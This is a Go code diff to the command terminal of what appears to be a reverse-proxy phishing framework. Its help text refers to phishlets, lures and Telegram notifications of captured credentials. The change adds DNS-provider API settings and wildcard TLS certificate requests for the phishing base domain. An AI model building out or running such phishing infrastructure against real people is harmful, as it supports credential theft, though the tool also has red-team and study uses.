@@ -195,12 +195,24 @@ func (t *Terminal) handleConfig(args []string) error {
 			autocertOnOff = "on"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "webhook_telegram", "autocert"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, t.cfg.GetWebhookTelegram(), autocertOnOff}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "webhook_telegram", "autocert", "dns_provider", "dns_api_key", "dns_api_secret"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, t.cfg.GetWebhookTelegram(), autocertOnOff, t.cfg.GetDnsProvider(), t.cfg.GetDnsApiKey(), t.cfg.GetDnsApiSecret()}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
 		switch args[0] {
+		case "dns_provider":
+			t.cfg.SetDnsProvider(args[1])
+			t.manageCertificates(true)
+			return nil
+		case "dns_api_key":
+			t.cfg.SetDnsApiKey(args[1])
+			t.manageCertificates(true)
+			return nil
+		case "dns_api_secret":
+			t.cfg.SetDnsApiSecret(args[1])
+			t.manageCertificates(true)
+			return nil
 		case "domain":
 			t.cfg.SetBaseDomain(args[1])
 			t.cfg.ResetAllSites()
@@ -1241,7 +1253,7 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off"))))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("dns_provider"), readline.PcItem("dns_api_key"), readline.PcItem("dns_api_secret")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1250,6 +1262,9 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "set Telegram webhook for credential notifications (format: bot_token/chat_id)")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
+	h.AddSubCommand("config", []string{"dns_provider"}, "dns_provider <gandi|cloudflare>", "set DNS provider for wildcard certificates")
+	h.AddSubCommand("config", []string{"dns_api_key"}, "dns_api_key <key>", "set DNS provider API key")
+	h.AddSubCommand("config", []string{"dns_api_secret"}, "dns_api_secret <secret>", "set DNS provider API secret (optional)")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1407,9 +1422,15 @@ func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
 		if t.cfg.IsAutocertEnabled() {
 			hosts := t.p.cfg.GetActiveHostnames("")
-			//wc_host := t.p.cfg.GetWildcardHostname()
-			//hosts := []string{wc_host}
-			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
+
+			if t.cfg.GetDnsProvider() != "" {
+				baseDomain := t.cfg.GetBaseDomain()
+				if baseDomain != "" {
+					hosts = append(hosts, "*."+baseDomain)
+					hosts = append(hosts, baseDomain)
+				}
+			}
+
 			if verbose {
 				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
 			}
